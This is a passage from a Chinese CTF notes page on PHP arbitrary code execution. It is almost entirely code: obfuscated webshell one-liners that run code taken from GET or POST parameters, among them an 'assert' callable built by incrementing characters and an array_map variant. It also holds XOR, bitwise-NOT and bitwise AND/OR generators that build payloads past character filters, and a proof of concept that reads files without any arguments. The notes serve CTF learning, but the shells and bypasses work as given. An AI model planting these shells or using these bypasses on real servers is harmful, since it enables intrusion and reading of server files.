<span class="hljs-keyword">echo</span> substr($rc-&gt;getDocComment(),<span class="hljs-number">-9</span>,<span class="hljs-number">-3</span>)($_GET[<span class="hljs-string">&apos;l1nk&apos;</span>]);
<span class="hljs-meta">?&gt;</span>
</code></pre>
<h2 id="bypass"><a name="bypass" class="anchor-navigation-ex-anchor" href="#bypass"><i class="fa fa-link" aria-hidden="true"></i></a>ByPass</h2>
<h3 id="&#x5F02;&#x6216;"><a name="&#x5F02;&#x6216;" class="anchor-navigation-ex-anchor" href="#&#x5F02;&#x6216;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x5F02;&#x6216;</h3>
<pre><code class="lang-python">payload=<span class="hljs-string">&quot;phpinfo&quot;</span>
allowed=<span class="hljs-string">&quot;ABCHIJKLMNQRTUVWXYZ\]^abchijklmnqrtuvwxyz}~!#%*+-/:;&lt;=&gt;?@&quot;</span><span class="hljs-comment"># no ()</span>
reth=<span class="hljs-string">&quot;&quot;</span>
rett=<span class="hljs-string">&quot;&quot;</span>
<span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> payload:
    flag=<span class="hljs-keyword">False</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> allowed:
        <span class="hljs-keyword">if</span> flag == <span class="hljs-keyword">False</span>:
            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> allowed:
                <span class="hljs-keyword">if</span> ord(i)^ord(j)==ord(c):
                    <span class="hljs-comment">#print(&quot;i=%s j=%s c=%s&quot;%(i,j,c))</span>
                    reth=reth+<span class="hljs-string">&quot;%&quot;</span>+str(hex(ord(i)))[<span class="hljs-number">2</span>:]
                    rett=rett+<span class="hljs-string">&quot;%&quot;</span>+str(hex(ord(j)))[<span class="hljs-number">2</span>:]
                    flag=<span class="hljs-keyword">True</span>
                    <span class="hljs-keyword">break</span>
ret=reth+<span class="hljs-string">&quot;^&quot;</span>+rett

<span class="hljs-keyword">print</span> ret
</code></pre>
<h4 id="&#x767D;&#x540D;&#x5355;&#x5F02;&#x6216;"><a name="&#x767D;&#x540D;&#x5355;&#x5F02;&#x6216;" class="anchor-navigation-ex-anchor" href="#&#x767D;&#x540D;&#x5355;&#x5F02;&#x6216;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x767D;&#x540D;&#x5355;&#x5F02;&#x6216;</h4>
<pre><code class="lang-php">$whitelist = [<span class="hljs-string">&apos;abs&apos;</span>, <span class="hljs-string">&apos;acos&apos;</span>, <span class="hljs-string">&apos;acosh&apos;</span>, <span class="hljs-string">&apos;asin&apos;</span>, <span class="hljs-string">&apos;asinh&apos;</span>, <span class="hljs-string">&apos;atan2&apos;</span>, <span class="hljs-string">&apos;atan&apos;</span>, <span class="hljs-string">&apos;atanh&apos;</span>,  <span class="hljs-string">&apos;bindec&apos;</span>, <span class="hljs-string">&apos;ceil&apos;</span>, <span class="hljs-string">&apos;cos&apos;</span>, <span class="hljs-string">&apos;cosh&apos;</span>, <span class="hljs-string">&apos;decbin&apos;</span> , <span class="hljs-string">&apos;decoct&apos;</span>, <span class="hljs-string">&apos;deg2rad&apos;</span>, <span class="hljs-string">&apos;exp&apos;</span>, <span class="hljs-string">&apos;expm1&apos;</span>, <span class="hljs-string">&apos;floor&apos;</span>, <span class="hljs-string">&apos;fmod&apos;</span>, <span class="hljs-string">&apos;getrandmax&apos;</span>, <span class="hljs-string">&apos;hexdec&apos;</span>, <span class="hljs-string">&apos;hypot&apos;</span>, <span class="hljs-string">&apos;is_finite&apos;</span>, <span class="hljs-string">&apos;is_infinite&apos;</span>, <span class="hljs-string">&apos;is_nan&apos;</span>, <span class="hljs-string">&apos;lcg_value&apos;</span>, <span class="hljs-string">&apos;log10&apos;</span>, <span class="hljs-string">&apos;log1p&apos;</span>, <span class="hljs-string">&apos;log&apos;</span>, <span class="hljs-string">&apos;max&apos;</span>, <span class="hljs-string">&apos;min&apos;</span>, <span class="hljs-string">&apos;mt_getrandmax&apos;</span>, <span class="hljs-string">&apos;mt_rand&apos;</span>, <span class="hljs-string">&apos;mt_srand&apos;</span>, <span class="hljs-string">&apos;octdec&apos;</span>, <span class="hljs-string">&apos;pi&apos;</span>, <span class="hljs-string">&apos;pow&apos;</span>, <span class="hljs-string">&apos;rad2deg&apos;</span>, <span class="hljs-string">&apos;rand&apos;</span>, <span class="hljs-string">&apos;round&apos;</span>, <span class="hljs-string">&apos;sin&apos;</span>, <span class="hljs-string">&apos;sinh&apos;</span>, <span class="hljs-string">&apos;sqrt&apos;</span>, <span class="hljs-string">&apos;srand&apos;</span>, <span class="hljs-string">&apos;tan&apos;</span>, <span class="hljs-string">&apos;tanh&apos;</span>];
$convert = [<span class="hljs-string">&apos;decbin&apos;</span>,<span class="hljs-string">&apos;decoct&apos;</span>];
<span class="hljs-keyword">foreach</span>($whitelist <span class="hljs-keyword">as</span> $a){
    <span class="hljs-keyword">foreach</span>($convert <span class="hljs-keyword">as</span> $b){
        <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;<span class="hljs-number">999999</span>;$i++){
            $result = $a ^ $b($i);
            <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&apos;/_GET|_POST|_REQUEST/&apos;</span>,$result)){
                <span class="hljs-keyword">echo</span> $a.<span class="hljs-string">&quot;^&quot;</span>.$b.<span class="hljs-string">&quot;(&quot;</span>.$i.<span class="hljs-string">&quot;)=&quot;</span>.$result.<span class="hljs-string">&quot;\n&quot;</span>;
            }
        }
    }
}
</code></pre>
<h4 id="&#x5F02;&#x6216;shell"><a name="&#x5F02;&#x6216;shell" class="anchor-navigation-ex-anchor" href="#&#x5F02;&#x6216;shell"><i class="fa fa-link" aria-hidden="true"></i></a>&#x5F02;&#x6216;shell</h4>
<h3 id="&#x53D6;&#x53CD;"><a name="&#x53D6;&#x53CD;" class="anchor-navigation-ex-anchor" href="#&#x53D6;&#x53CD;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x53D6;&#x53CD;</h3>
<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
$str = <span class="hljs-string">&apos;phpinfo&apos;</span>;
$str = str_split($str);
$flag=<span class="hljs-string">&apos;&apos;</span>;
<span class="hljs-keyword">foreach</span> ($str <span class="hljs-keyword">as</span>  $value) {
    $flag.=~$value;
}
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;(~&quot;</span>.urlencode($flag).<span class="hljs-string">&quot;)();&quot;</span>;
</code></pre>
<h3 id="&#x5B57;&#x7B26;&#x81EA;&#x589E;"><a name="&#x5B57;&#x7B26;&#x81EA;&#x589E;" class="anchor-navigation-ex-anchor" href="#&#x5B57;&#x7B26;&#x81EA;&#x589E;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x5B57;&#x7B26;&#x81EA;&#x589E;</h3>
<pre><code class="lang-php"><span class="hljs-meta">&lt;?</span>=[$_=[],
$_=@<span class="hljs-string">&quot;$_&quot;</span>,
$_=$_[<span class="hljs-string">&apos;!&apos;</span>==<span class="hljs-string">&apos;@&apos;</span>],
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$___=$__, 
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$___.=$__,
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$___.=$__,
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$___.=$__,
$__=$_,
$__++,$__++,$__++,$__++,
$___.=$__,
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$___.=$__,
$____=<span class="hljs-string">&apos;_&apos;</span>,
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$____.=$__,
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$____.=$__,
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$____.=$__,
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$____.=$__,
$_={% math %}____,
$___($_[<span class="hljs-string">&quot;_&quot;</span>])]<span class="hljs-meta">?&gt;</span> <span class="hljs-comment">//&quot;assert&quot;($_POST[&quot;_&quot;])</span>
</code></pre>
<pre><code class="lang-php"><span class="hljs-meta">&lt;?</span>=[$_=[],
$_=@<span class="hljs-string">&quot;$_&quot;</span>,
$_=$_[<span class="hljs-string">&apos;!&apos;</span>==<span class="hljs-string">&apos;@&apos;</span>],
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$___=$__,<span class="hljs-comment">//P</span>

$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$___.=$__,<span class="hljs-comment">//H</span>

$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$___.=$__,<span class="hljs-comment">//P</span>

$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$___.=$__,<span class="hljs-comment">//I</span>

$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$___.=$__,<span class="hljs-comment">//N</span>

$__=$_,
$__++,$__++,$__++,$__++,$__++,
$___.=$__,<span class="hljs-comment">//F</span>

$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$___.=$__,<span class="hljs-comment">//O</span>


$___()]<span class="hljs-meta">?&gt;</span>
</code></pre>
<pre><code class="lang-php"><span class="hljs-meta">&lt;?</span>=[$_=[],
$_=@<span class="hljs-string">&quot;$_&quot;</span>,
$_=$_[<span class="hljs-string">&apos;!&apos;</span>==<span class="hljs-string">&apos;@&apos;</span>],
$____=<span class="hljs-string">&apos;_&apos;</span>,
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$____.=$__,
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$____.=$__,
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$____.=$__,
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$____.=$__,
$_={% endmath %}____,
$_[<span class="hljs-string">&quot;__&quot;</span>]($_[<span class="hljs-string">&quot;_&quot;</span>])]<span class="hljs-meta">?&gt;</span><span class="hljs-comment">//$_POST[&quot;__&quot;]($_POST[&quot;_&quot;])</span>
</code></pre>
<p>&#x8FD8;&#x53EF;&#x4EE5;&#x7528; ``&lt;?=?&gt; &#x66FF;&#x4EE3;&#x5206;&#x53F7;&#x9017;&#x53F7;</p>
<pre><code class="lang-php">$_=[].[];<span class="hljs-comment">#$_=&apos;ArrayArray&apos;</span>
$_=<span class="hljs-string">&apos;&apos;</span>.[];<span class="hljs-comment">#$_=&apos;Array&apos;</span>
</code></pre>
<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span> $_=[].[];$__=<span class="hljs-number">0</span>;$__++;$__++;$__++;$_=$_[$__]; <span class="hljs-comment">#$_=&apos;a&apos;</span>
<span class="hljs-meta">&lt;?php</span> $_=<span class="hljs-string">&apos;&apos;</span>.[];$__=<span class="hljs-number">0</span>;$__++;$__++;$__++;$_=$_[$__]; <span class="hljs-comment">#$_=&apos;a&apos;</span>
</code></pre>
<h3 id="&#x6570;&#x5B57;&#x62FC;&#x63A5;"><a name="&#x6570;&#x5B57;&#x62FC;&#x63A5;" class="anchor-navigation-ex-anchor" href="#&#x6570;&#x5B57;&#x62FC;&#x63A5;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x201C;&#x6570;&#x5B57;&#x201D;&#x62FC;&#x63A5;</h3>
<blockquote>
<p> PHP &#x4E2D;&#xFF0C;&#x5C06;&#x4E24;&#x4E2A;&#x6570;&#x5B57;&#x4F7F;&#x7528;.&#x62FC;&#x63A5;&#xFF0C;&#x4F1A;&#x5F53;&#x505A;&#x5B57;&#x7B26;&#x4E32;&#x6765;&#x5904;&#x7406;&#xFF0C;&#x8FD4;&#x56DE;&#x7684;&#x4E5F;&#x662F;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x3002;&#x4F8B;&#x5982;&#xFF1A;(1).(2)&#x51FA;&#x6765;&#x7684;&#x5C31;&#x662F;&#x5B57;&#x7B26;&#x4E32;&quot;12&quot;&#xFF0C;&#x7136;&#x540E;&#x53EF;&#x4EE5;&#x7528;{}&#x6765;&#x4EE3;&#x66FF;[]&#x6765;&#x53D6;&#x5355;&#x4E2A;&#x5B57;&#x7B26;&#x3002;</p>
</blockquote>
<pre><code class="lang-php">$char = <span class="hljs-string">&apos;1234567890-INFAH@+*%$()&quot;!%meogiakcfhvwbnq_&apos;</span>;
<span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; strlen($char); $i++){
    <span class="hljs-keyword">for</span>($j = <span class="hljs-number">0</span>; $j &lt; strlen($char); $j++){
        <span class="hljs-keyword">echo</span>($char[$i] .<span class="hljs-string">&apos;&amp;&apos;</span> .$char[$j] . <span class="hljs-string">&apos; &apos;</span>. ($char[$i] &amp; $char[$j]));
        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>);
        <span class="hljs-keyword">echo</span>($char[$i] .<span class="hljs-string">&apos;|&apos;</span> .$char[$j] . <span class="hljs-string">&apos; &apos;</span>. ($char[$i] | $char[$j]));
        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>);
    }
}
</code></pre>
<p>sissel&#x5E08;&#x5085;&#x5199;&#x7684;&#x811A;&#x672C;</p>
<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
$old_list = <span class="hljs-string">&apos;INFA0123456789&apos;</span>;
$new_list = $old_list;

$result = <span class="hljs-keyword">array</span>(
    <span class="hljs-string">&quot;I&quot;</span>=&gt;<span class="hljs-string">&quot;((1/0).(0)){0}&quot;</span>,
    <span class="hljs-string">&quot;N&quot;</span>=&gt;<span class="hljs-string">&quot;((1/0).(0)){1}&quot;</span>,
    <span class="hljs-string">&quot;F&quot;</span>=&gt;<span class="hljs-string">&quot;((1/0).(0)){2}&quot;</span>,
    <span class="hljs-string">&quot;A&quot;</span>=&gt;<span class="hljs-string">&quot;((0/0).(0)){1}&quot;</span>,
    <span class="hljs-string">&quot;0&quot;</span>=&gt;<span class="hljs-string">&quot;((0).(0)){0}&quot;</span>,
    <span class="hljs-string">&quot;1&quot;</span>=&gt;<span class="hljs-string">&quot;((1).(0)){0}&quot;</span>,
    <span class="hljs-string">&quot;2&quot;</span>=&gt;<span class="hljs-string">&quot;((2).(0)){0}&quot;</span>,
    <span class="hljs-string">&quot;3&quot;</span>=&gt;<span class="hljs-string">&quot;((3).(0)){0}&quot;</span>,
    <span class="hljs-string">&quot;4&quot;</span>=&gt;<span class="hljs-string">&quot;((4).(0)){0}&quot;</span>,
    <span class="hljs-string">&quot;5&quot;</span>=&gt;<span class="hljs-string">&quot;((5).(0)){0}&quot;</span>,
    <span class="hljs-string">&quot;6&quot;</span>=&gt;<span class="hljs-string">&quot;((6).(0)){0}&quot;</span>,
    <span class="hljs-string">&quot;7&quot;</span>=&gt;<span class="hljs-string">&quot;((7).(0)){0}&quot;</span>,
    <span class="hljs-string">&quot;8&quot;</span>=&gt;<span class="hljs-string">&quot;((8).(0)){0}&quot;</span>,
    <span class="hljs-string">&quot;9&quot;</span>=&gt;<span class="hljs-string">&quot;((9).(0)){0}&quot;</span>,
);

<span class="hljs-keyword">while</span>(<span class="hljs-keyword">true</span>){
    <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; strlen($old_list); $i++){
        <span class="hljs-keyword">for</span>($j = <span class="hljs-number">0</span>; $j &lt; strlen($old_list); $j++){
            $tmp = ($old_list[$i]) &amp; ($old_list[$j]);
            <span class="hljs-keyword">if</span>(! <span class="hljs-keyword">isset</span>($result[$tmp])){
                $result[$tmp] = <span class="hljs-string">&quot;(&quot;</span>.$result[$old_list[$i]].<span class="hljs-string">&quot;)&amp;(&quot;</span>.$result[$old_list[$j]].<span class="hljs-string">&quot;)&quot;</span>;
                $new_list .= $tmp;
            } 

            $tmp = $old_list[$i] | $old_list[$j];
            <span class="hljs-keyword">if</span>(! <span class="hljs-keyword">isset</span>($result[$tmp])){
                $result[$tmp] = <span class="hljs-string">&quot;(&quot;</span>.$result[$old_list[$i]].<span class="hljs-string">&quot;)|(&quot;</span>.$result[$old_list[$j]].<span class="hljs-string">&quot;)&quot;</span>;
                $new_list .= $tmp;
            } 
        }
    }

    <span class="hljs-keyword">if</span>($new_list == $old_list)
        <span class="hljs-keyword">break</span>;
    $old_list = $new_list;
}
<span class="hljs-comment">//var_dump($result);</span>
<span class="hljs-comment">//var_dump($old_list);</span>

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gen</span><span class="hljs-params">($op)</span></span>{
    <span class="hljs-keyword">global</span> $result;
    $final = <span class="hljs-keyword">array</span>();
    <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; strlen($op); $i++){
        <span class="hljs-keyword">if</span>(!array_key_exists($op[$i],$result)){
            $final[]=(<span class="hljs-string">&quot;(&quot;</span>.$result[strtoupper($op[$i])].<span class="hljs-string">&quot;)&quot;</span>);
        }
        <span class="hljs-keyword">else</span> $final[]=(<span class="hljs-string">&quot;(&quot;</span>.$result[$op[$i]].<span class="hljs-string">&quot;)&quot;</span>);
    }
    <span class="hljs-comment">//var_dump($final);</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;(&quot;</span>.implode(<span class="hljs-string">&quot;.&quot;</span>,$final).<span class="hljs-string">&quot;)&quot;</span>;
}

$payload = gen(<span class="hljs-string">&quot;phpinfo&quot;</span>).gen(<span class="hljs-string">&quot;&quot;</span>).<span class="hljs-string">&quot;;&quot;</span>;

<span class="hljs-keyword">echo</span> $payload;

<span class="hljs-keyword">eval</span>($payload);
</code></pre>
<p>&#x6709;&#x4E9B;&#x5B57;&#x7B26;&#x53EF;&#x80FD;&#x65E0;&#x6CD5;&#x5229;&#x7528;<code>&amp;|</code>&#x751F;&#x6210;&#xFF0C;&#x53EF;&#x5229;&#x7528;php&#x5FFD;&#x7565;&#x5927;&#x5C0F;&#x5199;&#x7684;&#x7279;&#x6027;&#x7ED5;&#x8FC7;</p>
<h3 id="&#x65E0;&#x53C2;&#x6570;&#x8BFB;&#x6587;&#x4EF6;"><a name="&#x65E0;&#x53C2;&#x6570;&#x8BFB;&#x6587;&#x4EF6;" class="anchor-navigation-ex-anchor" href="#&#x65E0;&#x53C2;&#x6570;&#x8BFB;&#x6587;&#x4EF6;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x65E0;&#x53C2;&#x6570;&#x8BFB;&#x6587;&#x4EF6;</h3>
<p>&#x8FC7;&#x6EE4;&#x6761;&#x4EF6;</p>
<pre><code class="lang-php">preg_replace(<span class="hljs-string">&apos;/[a-z,_]+\((?R)?\)/&apos;</span>, <span class="hljs-keyword">NULL</span>, $_GET[<span class="hljs-string">&apos;exp&apos;</span>])
<span class="hljs-string">&apos;;&apos;</span> === preg_replace(<span class="hljs-string">&apos;/[^\W]+\((?R)?\)/&apos;</span>, <span class="hljs-string">&apos;&apos;</span>, $_GET[<span class="hljs-string">&apos;exp&apos;</span>])
</code></pre>
<p>&#x5229;&#x7528;<code>current(localeconv()) pos(localeconv()) === .</code></p>
<p>POC:</p>
<pre><code class="lang-php">show_source(array_rand(array_flip(scandir(current(localeconv()))))); <span class="hljs-comment">#&#x968F;&#x673A;&#x5F53;&#x524D;&#x8BFB;&#x76EE;&#x5F55;&#x4E0B;&#x6587;&#x4EF6;</span>
chdir(next(scandir(pos(localeconv()) <span class="hljs-comment">#chdir(next(scandir(pos(localeconv()</span>
</code></pre>
<pre><code>echo(readfile(end(scandir())))))));
</code></pre><h4 id="&#x53C2;&#x8003;&#x8D44;&#x6599;"><a name="&#x53C2;&#x8003;&#x8D44;&#x6599;" class="anchor-navigation-ex-anchor" href="#&#x53C2;&#x8003;&#x8D44;&#x6599;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x53C2;&#x8003;&#x8D44;&#x6599;</h4>
<p>RoarCTF Web writeup <a href="https://github.red/roarctf-web-writeup/" target="_blank">https://github.red/roarctf-web-writeup/</a></p>
<h2 id=""> </h2>
<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">argu</span><span class="hljs-params">($a, $b)</span></span>{
    $ext = explode(<span class="hljs-string">&apos;ABKing&apos;</span>,$a);
    $ext1 = $ext[<span class="hljs-number">0</span>];
    $ext2 = $ext[<span class="hljs-number">1</span>];
    $ext3 = $ext[<span class="hljs-number">2</span>];
    $ext4 = $ext[<span class="hljs-number">3</span>];
    $ext5 = $ext[<span class="hljs-number">4</span>];
    $ext6 = $ext[<span class="hljs-number">5</span>];
    $arr[<span class="hljs-number">0</span>] = $ext1.$ext2.$ext3.$ext4.$ext5.$ext6;
    $arr[<span class="hljs-number">1</span>] = $b;
    <span class="hljs-keyword">return</span> $arr;
}
$b = $_POST[<span class="hljs-string">&apos;x&apos;</span>];
$arr = argu(<span class="hljs-string">&quot;aABKingsABKingsABKingeABKingrABKingt&quot;</span>, $b);
$x = $arr[<span class="hljs-number">0</span>];
$y = $arr[<span class="hljs-number">1</span>];
array_map($x, <span class="hljs-keyword">array</span>($y));
<span class="hljs-meta">?&gt;</span>
</code></pre>
<footer class="page-footer"><span class="copyright">&#xA9; Eki&apos;s CTF-notes 2019-2021 CC-by-nc-sa 4.0&#x3002; all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x672C;&#x7F51;&#x7AD9;&#x6700;&#x540E;&#x4FEE;&#x8BA2;&#x4E8E;&#xFF1A;
2021-05-07 16:30:35
</span></footer> <link rel="stylesheet" type="text/css" href="https://storage.googleapis.com/app.klipse.tech/css/codemirror.css"> <script>     window.klipse_settings = {         selector: ".language-klipse, .lang-eval-clojure",         selector_eval_js: ".lang-eval-js",         selector_eval_python_client: ".lang-eval-python",         selector_eval_php: ".lang-eval-php",         selector_eval_scheme: ".lang-eval-scheme",         selector_eval_ruby: ".lang-eval-ruby",         selector_reagent: ".lang-reagent",        selector_google_charts: ".lang-google-chart",        selector_es2017: ".lang-eval-es2017",        selector_jsx: ".lang-eval-jsx",        selector_transpile_jsx: ".lang-transpile-jsx",        selector_render_jsx: ".lang-render-jsx",        selector_react: ".lang-react",        selector_eval_markdown: ".lang-render-markdown",        selector_eval_lambdaway: ".lang-render-lambdaway",        selector_eval_cpp: ".lang-eval-cpp",        selector_eval_html: ".lang-render-html",        selector_sql: ".lang-eval-sql",        selector_brainfuck: "lang-eval-brainfuck",        selector_js: ".lang-transpile-cljs"    }; </script> <script src="https://storage.googleapis.com/app.klipse.tech/plugin/js/klipse_plugin.js"></script>
                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="protocol.html" class="navigation navigation-prev " aria-label="Previous page: Protocol">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="serialize.html" class="navigation navigation-next " aria-label="Next page: Serialize">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"ACE","level":"1.2.4.3","depth":3,"next":{"title":"Serialize","level":"1.2.4.4","depth":3,"path":"library/php/serialize.md","ref":"library/php/serialize.md","articles":[]},"previous":{"title":"Protocol","level":"1.2.4.2","depth":3,"path":"library/php/protocol.md","ref":"library/php/protocol.md","articles":[]},"dir":"ltr"},"config":{"plugins":["expandable-chapters","splitter","katex","tbfed-pagefooter","theme-comscore","anchor-navigation-ex","-lunr","-search","search-plus","custom-favicon","ga","multipart","advanced-emoji","github","-sharing","sharing-plus","klipse","donate","pageview-count","code","lightbox","auto-scroll-table"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"&copy Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。","modify_label":"本网站最后修订于：","modify_format":"YYYY-MM-DD HH:mm:ss"},"github":{"url":"https://github.com/ekixu"},"splitter":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"auto-scroll-table":{},"multipart":{},"code":{"copyButtons":true},"donate":{"alipay":"https://ctf.ieki.xyz/assets/images/alipay.jpg","alipayText":"支付宝打赏","button":"赏","title":"","wechat":"https://ctf.ieki.xyz/assets/images/wechat.jpg","wechatText":"微信打赏"},"katex":{},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"anchor-navigation-ex":{"associatedWithSummary":false,"float":{"floatIcon":"fa fa-navicon","level1Icon":"fa fa-hand-o-right","level2Icon":"fa fa-hand-o-right","level3Icon":"fa fa-hand-o-right","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":false},"favicon":"/assets/images/favicon.ico","lightbox":{"jquery":true,"sameUuid":false},"theme-comscore":{},"pageview-count":{},"custom-favicon":{},"ga":{"configuration":"auto","token":"UA-156105693-2"},"klipse":{"myConfigKey":"it's the default value"},"advanced-emoji":{"embedEmojis":false},"sharing":{"qq":false,"all":["douban","facebook","google","instapaper","linkedin","twitter","weibo","messenger","qq","qzone","viber","whatsapp"],"douban":false,"facebook":false,"weibo":true,"twitter":true,"pocket":false,"google":true,"qzone":true},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{},"search-plus":{}},"theme":"default","author":"Eki","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Eki's CTF","links":{"sidebar":{"主站 Eki's Blog":"https://ieki.xyz"}},"gitbook":"*","description":"CTF笔记"},"file":{"path":"library/php/ace.md","mtime":"2021-05-07T08:30:35.937Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-05-07T08:31:26.574Z"},"basePath":"../..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../../gitbook/gitbook.js"></script>
    <script src="../../gitbook/theme.js"></script>
    
        
        <script src="../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-splitter/splitter.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-search-plus/jquery.mark.min.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-search-plus/search.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-ga/plugin.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-github/plugin.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-donate/plugin.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-pageview-count/plugin.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-code/plugin.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-lightbox/js/lightbox.min.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-auto-scroll-table/plugin.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-theme-comscore/test.js"></script>
        
    

    </body>
</html>

